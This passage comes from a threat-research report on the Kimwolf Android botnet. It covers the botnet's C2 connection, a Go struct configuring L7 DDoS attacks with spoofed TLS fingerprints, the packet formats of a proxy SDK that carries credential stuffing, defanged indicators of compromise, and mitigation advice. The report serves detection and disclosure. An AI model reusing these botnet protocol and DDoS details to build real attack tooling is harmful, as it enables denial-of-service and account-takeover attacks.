https://cdn.sanity.io/images/8hf8zboo/production/b029599937c277d310ddbf5fc015c34062553736-1999x181.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/b029599937c277d310ddbf5fc015c34062553736-1999x181.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/b029599937c277d310ddbf5fc015c34062553736-1999x181.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Android dropper executing Kimwolf" loading="lazy" width="1999" height="181"/><figcaption>Fig 8. Android dropper executing Kimwolf</figcaption></figure><p class="research-portable-paragraph">On execution, Kimwolf uses the environment variable xdrofl123 as a poor man&#x27;s mutex to prevent multiple versions of the binary from running. If the variable is present, it prevents another instance from starting.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/fd7f56d874be680463f69c4b9d4b67400b96af4b-990x80.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/fd7f56d874be680463f69c4b9d4b67400b96af4b-990x80.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/fd7f56d874be680463f69c4b9d4b67400b96af4b-990x80.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/fd7f56d874be680463f69c4b9d4b67400b96af4b-990x80.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/fd7f56d874be680463f69c4b9d4b67400b96af4b-990x80.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/fd7f56d874be680463f69c4b9d4b67400b96af4b-990x80.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Running Kimwolf" loading="lazy" width="990" height="80"/><figcaption>Fig 9. Running the Kimwolf binary</figcaption></figure><p class="research-portable-paragraph">In this latest version, Kimwolf listens on port 40860 and connects to 85[.]234[.]91[.]247:1337 for commands.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/0f064536067c2388dad1e18356bdc1208bf83beb-1999x1373.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/0f064536067c2388dad1e18356bdc1208bf83beb-1999x1373.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/0f064536067c2388dad1e18356bdc1208bf83beb-1999x1373.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/0f064536067c2388dad1e18356bdc1208bf83beb-1999x1373.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/0f064536067c2388dad1e18356bdc1208bf83beb-1999x1373.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/0f064536067c2388dad1e18356bdc1208bf83beb-1999x1373.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Initial connection and heartbeat" loading="lazy" width="1999" height="1373"/><figcaption>Fig 10. Initial connection and heartbeat</figcaption></figure><p class="research-portable-paragraph">Another notable update includes the significant expansion of Kimwolf L7 attacks. The new attacks use the <a href="https://github.com/bogdanfinn/tls-client" target="_blank" rel="noreferrer">tls-client</a> and <a href="https://github.com/Noooste/azuretls-client" target="_blank" rel="noreferrer">azuretls-client</a> Go libraries to spoof TLS fingerprints and headers. The Config for L7 attacks is as follows.</p><figure class="research-code-block" data-code-block="true" data-code="type%20Config%20struct%20%7B%0A%20%20%20URL%20%20%20*string%20%2F%2F%20URL%20of%20target%0A%20%20%20Method%20%20%20*string%20%2F%2F%20GET%2FPOST%2FPATCH%20etc%0A%20%20%20Http3Fingerprint%20*string%20%2F%2F%20bogdanfinn%20TLS%20client%20profile%20(Firefox_135)%0A%20%20%20Data%20%20%20*%5B%5Duint8%20%2F%2F%20data%20to%20send%20in%20body%0A%20%20%20FollowRedirects%20%20*bool%0A%20%20%20Headers%20%20%20*map%5Bstring%5Dstring%0A%20%20%20Cookies%20%20%20*map%5Bstring%5Dstring%0A%20%20%20Delay%20%20%20*time.Duration%20%2F%2F%20duration%20of%20attack%0A%7D" data-code-filename="structs.go"><figcaption><span class="research-code-title" title="structs.go">structs.go</span><span class="research-code-toolbar"><span class="research-code-language">GOLANG</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="structs.go source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">type Config struct {</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">2</span><span class="research-code-text">   URL   *string // URL of target</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">3</span><span class="research-code-text">   Method   *string // GET/POST/PATCH etc</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">4</span><span class="research-code-text">   Http3Fingerprint *string // bogdanfinn TLS client profile (Firefox_135)</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">5</span><span class="research-code-text">   Data   *[]uint8 // data to send in body</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">6</span><span class="research-code-text">   FollowRedirects  *bool</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">7</span><span class="research-code-text">   Headers   *map[string]string</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">8</span><span class="research-code-text">   Cookies   *map[string]string</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">9</span><span class="research-code-text">   Delay   *time.Duration // duration of attack</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">10</span><span class="research-code-text">}</span></span></code></pre></figure><p class="research-portable-paragraph">The complete Golang struct definitions for the Kimwolf botnet are documented <a href="https://github.com/synthient/public-research/blob/main/2026/01/kimwolf/structs.go" target="_blank" rel="noreferrer">Kimwolf protocol structures in Go</a>.</p><section class="research-section research-portable-section" id="byteconnect-sdk"><h2>Byteconnect SDK</h2></section><p class="research-portable-paragraph">In addition to capturing the Kimwolf payload on December 14th, Synthient’s Research Team also observed the installation of the Plainproxies Byteconnect SDK (<a href="https://www.virustotal.com/gui/search/e465e625c1f85527e7082ff70dc479b5" target="_blank" rel="noreferrer">e465e625c1f85527e7082ff70dc479b5</a>). This SDK offers a bandwidth monetization service, indicating that Kimwolf actors received payment for performing app installs on compromised devices. This further highlights the threat actors&#x27; monetization attempts, in addition to the operation of their own proxy services.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/c25370c655238495fa14411a87fded4334a7af0f-1999x990.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/c25370c655238495fa14411a87fded4334a7af0f-1999x990.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/c25370c655238495fa14411a87fded4334a7af0f-1999x990.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/c25370c655238495fa14411a87fded4334a7af0f-1999x990.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/c25370c655238495fa14411a87fded4334a7af0f-1999x990.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/c25370c655238495fa14411a87fded4334a7af0f-1999x990.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Byteconnect Landing Page" loading="lazy" width="1999" height="990"/><figcaption>Fig 11. A &quot;clean, ethical monetization that your users wont even notice.&quot;</figcaption></figure><p class="research-portable-paragraph">The ByteconnectSDK uses 119 relay servers that receive proxy tasks from a command-and-control server, which are then executed by the compromised device. These responses are sent back over the TCP socket.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/999b0fd2ba98fc0687c30795237afa5ada551a21-1918x860.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/999b0fd2ba98fc0687c30795237afa5ada551a21-1918x860.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/999b0fd2ba98fc0687c30795237afa5ada551a21-1918x860.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/999b0fd2ba98fc0687c30795237afa5ada551a21-1918x860.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/999b0fd2ba98fc0687c30795237afa5ada551a21-1918x860.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/999b0fd2ba98fc0687c30795237afa5ada551a21-1918x860.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Byteconnect flow" loading="lazy" width="1918" height="860"/><figcaption>Fig 12. Byteconnect connection and task flow.</figcaption></figure><p class="research-portable-paragraph">Upon connecting to the SDK, we observed an influx of credential-stuffing attacks targeting IMAP servers and popular online websites.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/c7e9a0a6cfd2449aa72b847f3d91effd9a648a2d-1999x763.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/c7e9a0a6cfd2449aa72b847f3d91effd9a648a2d-1999x763.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/c7e9a0a6cfd2449aa72b847f3d91effd9a648a2d-1999x763.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/c7e9a0a6cfd2449aa72b847f3d91effd9a648a2d-1999x763.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/c7e9a0a6cfd2449aa72b847f3d91effd9a648a2d-1999x763.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/c7e9a0a6cfd2449aa72b847f3d91effd9a648a2d-1999x763.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Byteconnect credential stuffing" loading="lazy" width="1999" height="763"/><figcaption>Fig 13. Byteconnect credential stuffing.</figcaption></figure><p class="research-portable-paragraph">Synthient’s Research Team notified Plainproxies and has yet to receive any comment. The ByteconnectSDK continues to remain active on compromised devices.</p><h3 class="research-portable-h3" id="byteconnect-protocol">Byteconnect Protocol</h3><p class="research-portable-paragraph"><strong class="text-contrast-high">Registration Request</strong></p><figure class="research-code-block" data-code-block="true" data-code="GET%20%2Fmeta%20HTTP%2F1.1%0AHost%3A%20new-endpoints.byteconnect.io%3A80%0AUser-Agent%3A%20TinyBC%0AApi-Key%3A%20%5Bredacted-by-Lighthouse%5D" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">TEXT</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">GET /meta HTTP/1.1</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">2</span><span class="research-code-text">Host: new-endpoints.byteconnect.io:80</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">3</span><span class="research-code-text">User-Agent: TinyBC</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">4</span><span class="research-code-text">Api-Key: [redacted-by-Lighthouse]</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">5</span><span class="research-code-text">Publisher-ID: PUBLISHER_WW_2</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">6</span><span class="research-code-text">Version: 106</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">7</span><span class="research-code-text">Connection: close</span></span></code></pre></figure><p class="research-portable-paragraph"><strong class="text-contrast-high">TCP Registration Packet</strong></p><figure class="research-code-block" data-code-block="true" data-code="VERSION%3BPUBLISHER_ID%3BARCHITECTURE%5Cn" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">TEXT</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">VERSION;PUBLISHER_ID;ARCHITECTURE\n</span></span></code></pre></figure><p class="research-portable-paragraph"><strong class="text-contrast-high">UDP Receive Task Packet</strong></p><figure class="research-code-block" data-code-block="true" data-code="%7BTYPE%7D%3B%7BTASK_ID%7D%3B%7BTARGET_HOST%3APORT%7D%3B%7BINITIAL_PAYLOAD%7D%5Cn" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">TEXT</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">{TYPE};{TASK_ID};{TARGET_HOST:PORT};{INITIAL_PAYLOAD}\n</span></span></code></pre></figure><p class="research-portable-paragraph"><strong class="text-contrast-high">UDP Get Task Packet</strong></p><figure class="research-code-block" data-code-block="true" data-code="%7BTASK_ID%7D%5Cn" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">TEXT</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">{TASK_ID}\n</span></span></code></pre></figure><section class="research-section research-portable-section" id="notifying-impacted-parties"><h2>Notifying Impacted Parties</h2></section><p class="research-portable-paragraph">Synthient notified IPIDEA, which confirmed and successfully patched the vulnerability on December 28th. This update now prevents access to local network devices and blocks access to the following sensitive ports: 21, 22, 23, 25, 69, 110, 139, 143, 161, 389, 465, 512, 513, 514, 587, 873, 993, 995, 1352, 1433, 1521, 2181, 2409, 3306, 3389, 3690, 4848, 5000, 5432, 5632, 5900, 6532, 6379, 7001, 7002, 8069, 9200, 9300, 11211, 27017, 27018, 50000, 5555, 5858, 12108, 3222, 1210, 5114.</p><p class="research-portable-paragraph">As part of this research, we sent 11 vulnerability emails on December 17th to the top proxy providers. Each notified provider was impacted to varying degrees, with a significant portion allowing access to devices on the local network. The scale of this vulnerability was unprecedented, exposing millions of devices to attacks. Synthient’s Research Team is unable to assess with confidence the complete list of targeted providers by Kimwolf. Current evidence indicates that IPIDEA was the main target because it enabled access to all ports.</p><section class="research-section research-portable-section" id="the-proxy-ecosystem"><h2>The Proxy Ecosystem</h2></section><p class="research-portable-paragraph">Kimwolf’s monetization strategy became apparent early on through its aggressive sale of residential proxies. By offering proxies as low as 0.20 cents per GB or $1.4K a month for unlimited bandwidth, it would gain early adoption by several proxy providers.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/084245f02db765b28d02770a91576f919a7a85e6-1920x1408.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/084245f02db765b28d02770a91576f919a7a85e6-1920x1408.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/084245f02db765b28d02770a91576f919a7a85e6-1920x1408.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/084245f02db765b28d02770a91576f919a7a85e6-1920x1408.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/084245f02db765b28d02770a91576f919a7a85e6-1920x1408.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/084245f02db765b28d02770a91576f919a7a85e6-1920x1408.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="RESITO Discord Server and the selling of Kimwolf proxies in early October." loading="lazy" width="1920" height="1408"/><figcaption>Fig 14. RESITO Discord Server and the selling of Kimwolf proxies in early October.</figcaption></figure><p class="research-portable-paragraph">Synthient’s Research Team received screenshots from other proxy providers showing key Kimwolf actors attempting to offload proxy bandwidth in exchange for upfront cash. This approach likely helped fuel early development, with associated members spending earnings on infrastructure and outsourced development tasks. Please note that resellers know precisely what they are selling; proxies at these prices are not ethically sourced.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/52707e86046d07be166da2b731a3ca62dd2f5983-1999x703.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/52707e86046d07be166da2b731a3ca62dd2f5983-1999x703.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/52707e86046d07be166da2b731a3ca62dd2f5983-1999x703.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/52707e86046d07be166da2b731a3ca62dd2f5983-1999x703.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/52707e86046d07be166da2b731a3ca62dd2f5983-1999x703.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/52707e86046d07be166da2b731a3ca62dd2f5983-1999x703.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Maskify, another provider heavily involved in the sales of Kimwolf proxies." loading="lazy" width="1999" height="703"/><figcaption>Fig 15. Maskify, another provider heavily involved in the sales of Kimwolf proxies.</figcaption></figure><p class="research-portable-paragraph">The aggressive tracking of Kimwolf helped create a novel dataset, enabling clients of Synthient to mitigate both DDoS and credential-stuffing attacks targeting their platform. Synthient actively tracks Kimwolf through the following providers.</p><div class="research-table-wrap interactive-focus synthient-scrollbar" role="region" aria-label="Research data table" tabindex="0"><table><thead><tr><th scope="col">Proxy Provider</th><th scope="col">Synthient Tag</th><th scope="col">Gateway</th></tr></thead><tbody><tr><td>https://discord[.]gg/ipv4</td><td>RESITO</td><td>172[.]93[.]102[.]243:80</td></tr><tr><td>https://discord[.]gg/ipv4</td><td>RESITO</td><td>104[.]243[.]43[.]148:80</td></tr><tr><td>https://discord[.]gg/ipv4</td><td>RESITO</td><td>104[.]243[.]41[.]180:80</td></tr><tr><td>https://discord[.]gg/ipv4</td><td>RESITO</td><td>104[.]243[.]41[.]110:80</td></tr><tr><td>https://discord[.]gg/ipv4</td><td>RESITO</td><td>80.75[.]212[.]10:80</td></tr><tr><td>https://discord[.]gg/ipv4</td><td>RESITO</td><td>193[.]25[.]217[.]66</td></tr><tr><td>https://maskify[.]su</td><td>MASKIFY</td><td>resi[.]maskify[.]su:80</td></tr><tr><td>https://ptun[.]nl</td><td>PTUNNL</td><td>resi[.]ptun[.]nl:80</td></tr><tr><td>https://flashproxy[.]com</td><td>FLASHPROXY_LITE</td><td>lite[.]flashproxy[.]io:6969</td></tr></tbody></table></div><p class="research-portable-paragraph">Several larger proxy providers have also been observed mixing in Kimwolf proxies to increase the size of their core pool.</p><section class="research-section research-portable-section" id="mitigation-strategies"><h2>Mitigation Strategies</h2></section><h3 class="research-portable-h3" id="proxy-providers">Proxy Providers</h3><p class="research-portable-paragraph">If you are a proxy provider and want to test whether you are vulnerable, you can do so by issuing a request to the domain <span>amivulnerable.synthient.com</span>. If you see a default router page, your proxy network is vulnerable. Proxy providers should implement necessary fixes to block requests to RFC 1918 addresses.</p><figure class="research-code-block" data-code-block="true" data-code="curl%20-x%20%22protocol%3A%2F%2Fuser%3Apass%40host%3Aport%22%20%22http%3A%2F%2Famivulnerable.synthient.com%22" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">TEXT</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="code source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">curl -x &quot;protocol://user:pass@host:port&quot; &quot;http://amivulnerable.synthient.com&quot;</span></span></code></pre></figure><p class="research-portable-paragraph">Additionally, proxy providers should check whether they are affected by reviewing existing logs for requests to the following domains.</p><ul class="research-bullet-list"><li>localhost</li><li>127[.]0[.]0[.]0</li><li>127[.]0[.]0[.]1</li><li>127[.]0[.]0[.]2</li><li>0[.]0[.]0[.]0</li><li>xd[.]resi[.]to</li><li>xd[.]mob[.]to</li><li>onetwoseven[.]14emeliaterracewestroxburyma02132[.]su</li><li>lolxd[.]713mtauburnctcolumbusoh43085[.]st</li></ul><h3 class="research-portable-h3" id="victims-of-kimwolf">Victims of Kimwolf</h3><p class="research-portable-paragraph">Users can check if they are a victim of the Kimwolf botnet on <a href="/context">synthient.com/check</a>. If flagged, we encourage the TV Box to be destroyed.</p><h3 class="research-portable-h3" id="organizations">Organizations</h3><ul class="research-bullet-list"><li><strong class="text-contrast-high">Audit Network &amp; Devices</strong>: Reference the complete list of Indicators of Compromise (IOCs) and inspect your network traffic and hardware for signs of infection.</li><li><strong class="text-contrast-high">Remove High-Risk Hardware</strong>: Avoid keeping potentially vulnerable devices, specifically TV boxes, on your network, as these are Kimwolf&#x27;s primary targets.</li><li><strong class="text-contrast-high">Secure ADB Shells</strong>: Lock down devices running unauthenticated ADB (Android Debug Bridge) shells to prevent unauthorized access.</li><li><strong class="text-contrast-high">Check for Proxy SDKs: </strong>Verify your IP address to ensure your system isn&#x27;t running a proxy 